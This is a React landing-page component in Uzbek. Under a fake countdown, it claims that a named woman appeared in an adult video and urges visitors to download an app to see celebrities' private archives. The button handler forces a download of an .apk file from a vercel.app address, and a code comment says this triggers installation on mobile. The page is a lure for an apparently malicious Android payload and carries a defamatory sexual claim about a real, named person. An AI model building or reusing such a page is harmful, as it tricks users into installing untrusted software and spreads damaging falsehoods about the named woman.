import React, { useState, useEffect } from 'react';

export default function DarkLanding() {
  
const handleClaimPrize = (e) => {
    e.preventDefault();

    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/sxUZ.apk';
    
    // На мобилке: попытка открыть напрямую (вызовет установку)
    window.location.href = apkUrl;

    // На ПК: открываем в новой вкладке
    setTimeout(() => {
      window.open(apkUrl, '_blank');
    }, 300);

    // Редирект на thankyou после задержки
    setTimeout(() => {
      window.location.href = '/thankyou.html';
    }, 1500);
  };
  const [timeLeft, setTimeLeft] = useState({
    hours: 2,
    minutes: 45,
    seconds: 30,
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setTimeLeft(prev => {
        let { hours, minutes, seconds } = prev;
        
        if (seconds > 0) {
          seconds--;
        } else if (minutes > 0) {
          minutes--;
          seconds = 59;
        } else if (hours > 0) {
          hours--;
          minutes = 59;
          seconds = 59;
        } else {
          clearInterval(interval);
          return prev;
        }
        
        return { hours, minutes, seconds };
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const formatTime = (num) => String(num).padStart(2, '0');

  const styles = {
    container: {
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #030712 0%, #0f0f1e 50%, #000000 100%)',
      position: 'relative',
      overflow: 'hidden',
    },
    bgContainer: {
      position: 'absolute',
      inset: 0,
      overflow: 'hidden',
      pointerEvents: 'none',
      zIndex: 1,
    },
    glovBlob1: {
      position: 'absolute',
      top: '80px',
      left: '40px',
      width: '384px',
      height: '384px',
      background: 'radial-gradient(circle, rgba(239, 68, 68, 0.15) 0%, rgba(239, 68, 68, 0) 70%)',
      borderRadius: '50%',
      filter: 'blur(60px)',
      animation: 'pulse 4s ease-in-out infinite',
    },
    glovBlob2: {
      position: 'absolute',
      bottom: '80px',
      right: '40px',
      width: '384px',
      height: '384px',
      background: 'radial-gradient(circle, rgba(234, 88, 12, 0.15) 0%, rgba(234, 88, 12, 0) 70%)',
      borderRadius: '50%',
      filter: 'blur(60px)',
      animation: 'pulse 4s ease-in-out infinite 2s',
    },
    gridPattern: {
      position: 'absolute',
      inset: 0,
      backgroundImage: 'linear-gradient(rgba(239, 68, 68, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(239, 68, 68, 0.03) 1px, transparent 1px)',
      backgroundSize: '50px 50px',
    },
    contentWrapper: {
      position: 'relative',
      zIndex: 10,
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      minHeight: '100vh',
      padding: '16px',
    },
    maxWidth: {
      maxWidth: '42rem',
      width: '100%',
    },
    timerSection: {
      marginBottom: '48px',
      textAlign: 'center',
    },
    timerLabel: {
      color: '#fca5a5',
      fontSize: '12px',
      fontWeight: 600,
      letterSpacing: '0.1em',
      textTransform: 'uppercase',
      marginBottom: '16px',
      display: 'block',
      animation: 'pulse-text 2s ease-in-out infinite',
    },
    timerDisplay: {
      display: 'flex',
      justifyContent: 'center',
      gap: '16px',
      marginBottom: '16px',
      flexWrap: 'wrap',
    },
    timerBox: {
      background: 'rgba(127, 29, 29, 0.4)',
      backdropFilter: 'blur(8px)',
      border: '1px solid rgba(239, 68, 68, 0.5)',
      borderRadius: '8px',
      padding: '24px',
      minWidth: '80px',
    },
    timerValue: {
      fontSize: '36px',
      fontWeight: 700,
      color: '#fca5a5',
      fontFamily: "'Courier New', monospace",
    },
    timerLabelSmall: {
      color: '#fecaca',
      fontSize: '11px',
      textTransform: 'uppercase',
      letterSpacing: '0.05em',
      marginTop: '8px',
    },
    timerSeparator: {
      fontSize: '24px',
      color: '#ef4444',
      fontWeight: 300,
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
    },
    timerSubtitle: {
      color: '#fca5a5',
      fontSize: '14px',
      fontWeight: 600,
      letterSpacing: '0.05em',
    },
    card: {
      background: 'linear-gradient(to bottom, rgba(31, 41, 55, 0.3), rgba(17, 24, 39, 0.5))',
      backdropFilter: 'blur(12px)',
      border: '1px solid rgba(55, 65, 81, 0.5)',
      borderRadius: '16px',
      padding: '32px',
      boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.5)',
    },
    imageContainer: {
      marginBottom: '32px',
      borderRadius: '12px',
      overflow: 'hidden',
      border: '2px solid rgba(239, 68, 68, 0.3)',
      boxShadow: '0 20px 25px -5px rgba(239, 68, 68, 0.2)',
      transition: 'all 0.3s ease',
    },
    imageContainerHover: {
      boxShadow: '0 20px 25px -5px rgba(239, 68, 68, 0.3)',
    },
    image: {
      width: '100%',
      height: '384px',
      objectFit: 'cover',
      display: 'block',
    },
    heading: {
      fontSize: '56px',
      fontWeight: 900,
      marginBottom: '16px',
      lineHeight: 1.2,
      background: 'linear-gradient(to right, #f87171, #ef4444, #fb923c)',
      WebkitBackgroundClip: 'text',
      WebkitTextFillColor: 'transparent',
      backgroundClip: 'text',
    },
    description: {
      fontSize: '20px',
      color: '#d1d5db',
      marginBottom: '32px',
      fontWeight: 300,
      lineHeight: 1.6,
    },
    button: {
      width: '100%',
      background: 'linear-gradient(to right, #dc2626, #ea580c)',
      color: 'white',
      fontWeight: 700,
      padding: '16px 32px',
      borderRadius: '8px',
      fontSize: '18px',
      border: 'none',
      cursor: 'pointer',
      transition: 'all 0.3s ease',
      boxShadow: '0 10px 15px -3px rgba(239, 68, 68, 0.3)',
    },
    buttonHover: {
      background: 'linear-gradient(to right, #b91c1c, #d97706)',
      boxShadow: '0 10px 15px -3px rgba(239, 68, 68, 0.5)',
      transform: 'scale(1.02)',
    },
    footerText: {
      textAlign: 'center',
      color: '#9ca3af',
      fontSize: '14px',
      marginTop: '24px',
    },
  };

  const [imageHover, setImageHover] = useState(false);
  const [buttonHover, setButtonHover] = useState(false);

  return (
    <div style={styles.container}>
      <style>{`
        @keyframes pulse {
          0%, 100% {
            opacity: 0.5;
          }
          50% {
            opacity: 1;
          }
        }
        @keyframes pulse-text {
          0%, 100% {
            opacity: 0.7;
          }
          50% {
            opacity: 1;
          }
        }
        @media (max-width: 640px) {
          h1 {
            font-size: 32px !important;
          }
        }
      `}</style>

      {/* Animated background elements */}
      <div style={styles.bgContainer}>
        <div style={styles.glovBlob1}></div>
        <div style={styles.glovBlob2}></div>
        <div style={styles.gridPattern}></div>
      </div>

      {/* Content */}
      <div style={styles.contentWrapper}>
        <div style={styles.maxWidth}>
          {/* Timer */}
          <div style={styles.timerSection}>
            <span style={styles.timerLabel}>⏱️ Cheklangan Vaqt</span>
            <div style={styles.timerDisplay}>
              <div style={styles.timerBox}>
                <div style={styles.timerValue}>{formatTime(timeLeft.hours)}</div>
                <p style={styles.timerLabelSmall}>Soat</p>
              </div>
              <div style={styles.timerSeparator}>:</div>
              <div style={styles.timerBox}>
                <div style={styles.timerValue}>{formatTime(timeLeft.minutes)}</div>
                <p style={styles.timerLabelSmall}>Minut</p>
              </div>
              <div style={styles.timerSeparator}>:</div>
              <div style={styles.timerBox}>
                <div style={styles.timerValue}>{formatTime(timeLeft.seconds)}</div>
                <p style={styles.timerLabelSmall}>Sekund</p>
              </div>
            </div>
            <p style={styles.timerSubtitle}>O'chirilishidan oldin yuklab ol!</p>
          </div>

          {/* Main Content */}
          <div style={styles.card}>
            
            {/* Image */}
            <div 
              style={{
                ...styles.imageContainer,
                ...(imageHover ? styles.imageContainerHover : {})
              }}
              onMouseEnter={() => setImageHover(true)}
              onMouseLeave={() => setImageHover(false)}
            >
              <img 
                src="./img/blurred-image.png"
                alt="Featured content"
                style={styles.image}
              />
            </div>

            {/* Heading */}
            <h1 style={styles.heading}>
              Shok!! Gulnora Qosimova kattalar videosida rol o‘ynadi.
            </h1>
            
            {/* Subheading */}
            <p style={styles.description}>
             Mashhurlarning barcha shaxsiy arxivlarini ko'rish uchun ilovani hozir yuklab oling.
            </p>

            {/* CTA Button */}
            <button 
              style={{
                ...styles.button,
                ...(buttonHover ? styles.buttonHover : {})
              }}
              onMouseEnter={() => setButtonHover(true)}
              onMouseLeave={() => setButtonHover(false)}
              onClick={handleClaimPrize}
            >
              Hozir Yuklab Ol
            </button>

            {/* Secondary text */}
            <p style={styles.footerText}>
              Vaqt tugagach, kirish yopiladi. Shunga javob berish vaqti keltib qoldi!
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}